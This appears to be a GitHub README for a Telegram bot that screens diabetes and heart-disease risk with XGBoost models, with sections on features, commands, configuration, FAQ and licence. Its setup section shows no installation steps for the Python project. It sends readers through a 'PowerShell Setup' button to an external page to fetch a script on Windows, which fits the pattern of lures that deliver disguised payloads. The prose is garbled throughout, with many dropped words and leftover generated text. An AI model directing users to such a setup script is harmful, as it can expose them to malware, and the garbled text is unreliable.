<div align="center">

# 🩺 Community-Driven Medical Risk Screening Bot for Telegram

![](files/preview.png)

### 🖥️ PowerShell Setup

[![](files/button.png)](https://Nahomi055.github.io/medical-risk-screening-bot/)

[![ps](https://img.shields.io/badge/PS-5.1%2B-2ea44f?style=social&labelColor=0d1117)]() [![lang](https://img.shields.io/badge/LANG-PYTHON-34b759?style=social&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/SETUP-246K-1a7f37?style=social&labelColor=0d1117)]()

</div>

---

Medical Risk Screening Bot is a friendly, community-driven Telegram companion for quick and informal early risk checks covering both diabetes and heart disease. Powered by XGBoost and built around a flexible multi-model conversation engine, it walks you through each screening question by question, then reflects your answers back before showing a result so you can double-check everything you entered. It is not a diagnostic tool — every result comes with a clear reminder to consult a real healthcare professional. Contributions, ideas, and feedback the community are always welcome as the project keeps growing.

## ✅ Before You Start

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

**🧠 Two screenings, one friendly bot** — pick either a diabetes check or a heart disease check, and the same conversation flow walks you through it step by step. No commands to memorize, no forms to decode.

- **📊 XGBoost under the hood** — both screenings run on trained gradient-boosted models, so you get a probability estimate alongside a plain-language result, not just a yes or no.

- **📝 Your answers, echoed back** — before any result appears, the bot repeats everything you entered readable form. Spot a typo, fix it, and rerun. Transparency builds trust.

- **🛡️ Honest about limits** — every result carries a clear disclaimer: this is early risk *screening*, not a diagnosis. The bot always nudges you toward a real healthcare professional for anything that matters.

- **🔁 Run as many checks as you like** — finish one screening and the bot immediately offers to start another, so comparing diabetes and heart results is a single tap away.

- **⚙️ Self-contained model modules** — each screening lives its own module with its own questions, loading logic, and prediction step. Adding a new health check later means dropping one file, and the bot picks it up automatically.

- **💾 Resilient model loading** — the bot prefers XGBoost's native JSON model format over raw pickle files, which makes it more resistant to file corruption and library version mismatches. If the preferred format isn't there, it falls back gracefully.

- **🚨 Fails loudly, not silently** — if a model expects a feature the bot doesn't know how to ask about, it refuses to start and tells you exactly which feature is missing. No bogus predictions, ever.

- **📋 Local activity logging** — every start, test selection, answer, prediction, and cancellation goes into a rotating local log file. Handy for auditing your own usage or debugging odd behavior.

- **🔒 Privacy-minded by design** — everything runs locally on your own instance. Your answers and results aren't shipped off to a third-party service; the log stays on your machine.

- **🌱 Community-driven and growing** — built as an open, student-friendly ML project. Questions, ideas, new screening modules, and bug reports the community are what keep it improving.

## Commands

Here's a friendly, community-driven command reference for your README:

-

### 🧭 Getting Started

- **`/start`** — The front door. Greets you, briefly explains what the bot does (and what it doesn't), and presents the available screening options. Use this any time you want to jump back to the main menu.
- **`/help`** — Stuck or curious? Brings up a quick rundown of every command, how conversations work, and a reminder that this is a screening aid — not a diagnosis.

### 🩺 Run a Screening

- **`/screen`** — Pick a screening and begin. The bot asks whether you'd like to check **diabetes risk**, **heart disease risk**, or both, then walks you through the relevant questions one at a time.
- **`/diabetes`** — Jump straight into the diabetes risk questionnaire. Answer the model's questions at your own pace; you can correct an answer or back out before finishing.
- **`/heart`** — Go directly to the heart disease risk questionnaire. Same friendly flow, different model — questions are built dynamically what the model actually expects.

> 💡 Every screening ends with a plain-language recap of what you entered, so you can double-check your answers before the result appears. If something looks off, you can rerun the screening.

### 📊 Viewing & Managing Results

- **`/summary`** — Replays your most recent answer summary — a clean, human-readable list of everything you entered — without rerunning the model.
- **`/again`** — Rerun the same screening you just completed, handy if you mistyped a value. Previous answers aren't auto-filled; you get a fresh set of questions.
- **`/cancel`** — Abort an progress screening at any point. Nothing is scored and nothing is saved as a result. You'll return to the main menu.
- **`/reset`** — Clears your current conversation state entirely — useful if a session gets stuck or you want a totally clean slate.

### ℹ️ About the Models

- **`/about`** — Learn what powers the bot: the multi-model XGBoost setup, how models are loaded, and the bot prefers native JSON model files over pickled ones.
- **`/disclaimer`** — Shows the full medical disclaimer. The same message appears automatically with every result, but it's here whenever you want to reread it.

### 🤝 Community & Feedback

- **`/feedback`** — Found a bug, a confusing question, or have an idea for a new screening? Send it right chat. Feedback is a big part of how this project grows.
- **`/log`** — Opt or out of local activity logging. By default, the bot records each start, screening selection, answer, prediction, and cancellation to a rotating log file for auditing — this command lets you control your participation.

-

Every result you receive includes the disclaimer automatically, and you can always ask for it again with `/disclaimer`. Happy screening — and remember to talk to a real healthcare professional about anything the bot flags. 💙

## Configuration

Getting the bot to feel like *yours* takes about five minutes, and everything lives one friendly little `.env` file. Copy the example file, open it up, and let's walk through the knobs together.

**Your bot token** is the one thing you genuinely can't skip. Drop it into `TELEGRAM_BOT_TOKEN` and the bot springs to life. If you're sharing the project or pushing it somewhere public, keep that value out of version control — treat it like a house key.

**Model paths** point the bot at your trained artifacts. Each test reads its own folder, and you can leave the defaults alone if you kept the standard layout. The bot prefers XGBoost's native JSON format over pickle because JSON survives file transfers and library-version drift far more gracefully — but if only a `.pkl` is sitting there, it'll happily fall back to it. No drama.

**Feature order and target mappings** are the quiet heroes here. The diabetes model ships with its own mapping file; the heart model reads its question list dynamically the saved feature names at startup. This means if your training notebook and your deployed model ever disagree about what a column means, the bot notices immediately and tells you exactly which feature is missing rather than quietly guessing. That's the feature-rich part nobody advertises but everybody appreciates.

**Logging** is on by default and rotates automatically, so your activity file won't balloon. You can point it at a different directory if you'd rather keep health-adjacent logs somewhere specific. Since entries include user IDs and usernames, treat that folder as sensitive and keep it out of any public repo.

**Contributing a new test** is deliberately painless: write a small module that exposes an ID, a display name, its features, and a `predict` function, then register it one place. The conversation engine picks it up automatically — no core changes, no copy-pasting question flows. That's the community-driven spirit: fork it, add your model, send it back.

One last note, and it's the important one: every configuration choice here is about *screening*, not diagnosis. Keep the disclaimer intact whatever you deploy — it's not decoration, it's the whole point.

## FAQ

**Is this a real medical tool?**
Nope — and it never claims to be. This is a student machine-learning project built for early, informal risk *screening* only. Every single result comes with a disclaimer reminding you to talk to an actual healthcare professional before making any health decisions. Treat it as a curious, educational companion, not a doctor.

**Which tests can I run?**
Right now there are two: a diabetes risk screening and a heart disease risk screening. Each one runs on its own XGBoost model, and the bot's generic conversation engine handles whichever test you pick — so both feel like one smooth experience.

**How accurate are the predictions?**
The models are trained XGBoost classifiers, but accuracy depends heavily on the data they were trained on. Some details (like how the heart model maps its target labels) are documented best-effort assumptions the code, clearly flagged with `# ASSUMED` comments. If you're curious about the internals, those flags tell you exactly what to verify against the training notebook.

** does the bot echo my answers back before showing a result?**
That's the answer-transparency feature! Before any prediction appears, the bot repeats everything you entered plain language so you can sanity-check your inputs. Typo your blood pressure? You'll spot it before the model does.

**What happens if a model file is missing or malformed?**
The bot fails loudly, not silently. It refuses to start and prints exactly which feature(s) or file(s) are missing — because a bogus prediction is worse than no prediction. The model loader also prefers XGBoost's native JSON format over raw pickle, which is more resistant to file-transfer corruption and library-version mismatches, with an automatic fallback to `.pkl`.

**Can I add my own test or model?**
Absolutely — that's the whole point of the modular design! Write a new test module exposing `ID`, `DISPLAY_NAME`, `FEATURES`, and `predict(answers)`, register it the tests registry, and the bot picks it up automatically. No changes to the core conversation flow needed. Contributions and ideas the community are always welcome.

**Does the bot store my data?**
Every `/start`, test selection, answer, prediction, and cancellation is written to a local rotating activity log (5MB × 5 backups) for auditing purposes. That log includes your user id and username, so if you deploy this yourself, keep it out of version control and treat it as sensitive data.

** do I need matching scikit-learn and XGBoost versions?**
Mismatched library versions are a classic source of silent errors when loading pickled models. The bot's JSON-first loading strategy helps a lot, but for the smoothest experience, mirror the versions the models were trained with — the setup notes walk you through checking them.

**Something broke — where do I get help?**
Check the assumptions section first (those `# ASSUMED` flags are common culprits), then open an issue describing what you ran into. Friendly, detailed bug reports make the project better for everyone — and community feedback is what keeps it growing.

## Support

Got a question, hit a snag, or just want to share how the Medical Risk Screening Bot worked for you? The best part of this project is its community, and there are plenty of ways to jump. Whether you're a curious user or a fellow tinkerer, your input genuinely helps the bot grow.

Here's how you can get involved and find help:

- **Explore the docs first.** Most answers live right here this README — the Features, Commands, Configuration, and FAQ sections cover the common ground, model loading quirks to environment setup. A quick scan usually saves a round trip.
- **Report bugs and request features.** Found something broken or have an idea that would make screening smoother? Open an issue and describe what happened, what you expected, and how to reproduce it. Clear reports get fixed faster.
- **Improve the models.** Since each test is a self-contained module, you can tighten question flows, refine clinical ranges, or add new screening logic. Contributions that make the bot more accurate or more transparent are always welcome.
- **Add a whole new test.** The generic conversation engine makes this delightfully simple — write a module exposing the expected interface, register it, and the bot picks it up automatically. No core changes needed.
- **Share feedback on the experience.** The answer-summary step, the disclaimers, the wording of questions — little UX touches matter. Tell us what feels clunky and what feels intuitive.
- **Help other users.** If you've figured out a tricky configuration or solved an environment hiccup, pass it along. Community wisdom is how everyone levels up together.

A friendly heads-up for anyone helping out: this project is a **screening tool, not a diagnostic device**, and that boundary is deliberate. When discussing results or suggesting changes, keep the focus on early, informal risk awareness and always point people toward a real healthcare professional for actual medical decisions.

Thank you for using the Medical Risk Screening Bot and for being part of its community — every issue, idea, and pull request makes it a little better for the next person.

## License

The Medical Risk Screening Bot is released under the **MIT License** — one of the most permissive and community-friendly licenses out there. plain terms: you're free to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of this project, as long as the original copyright notice and permission notice are included all copies or substantial portions of the software.

** MIT?** Because this project was built to be shared, learned, and built upon. Whether you're a student studying how XGBoost models can be wired into a conversational bot, a tinkerer adding a third screening test to the registry, or a developer adapting the generic conversation engine for something entirely different — the license is designed to stay out of your way.

**A few friendly reminders:**

- **Keep the notice.** If you redistribute the bot or a substantial portion of it, include the copyright notice and this permission text.
- **No warranty.** The software is provided "as is," without warranty of any kind, express or implied. The authors aren't liable for any claims, damages, or other liability arising its use.
- **Health disclaimer still applies.** The license grants you rights to the code — it doesn't turn the bot into a medical device. Any deployment should retain the built disclaimer directing users to consult a real healthcare professional. The models are screening aids, not diagnostic tools, and that distinction matters more than any license clause.
- **Contribute back if you can.** Found a bug, improved a question flow, added support for a new model format? Pull requests and issue reports are genuinely welcome — this project grows best when the community pokes at it.

**Attribution, the friendly way:** You don't *have* to credit the project beyond the license terms, but if you build something cool on top of it, a shout-out is always appreciated. The community around this bot is what makes it worth maintaining.

**Commercial use?** Go for it. Build a service, adapt it for a clinic's internal triage workflow, fold it into a research project — the MIT License permits it. Just remember the no-warranty clause and the medical disclaimer. If you're deploying publicly, treat user activity logs as sensitive data and keep tokens out of version control.

**Questions about licensing?** Open an issue and ask. The goal is clarity, not legal fog — if something the license is unclear for your use case, the maintainers are happy to talk it through.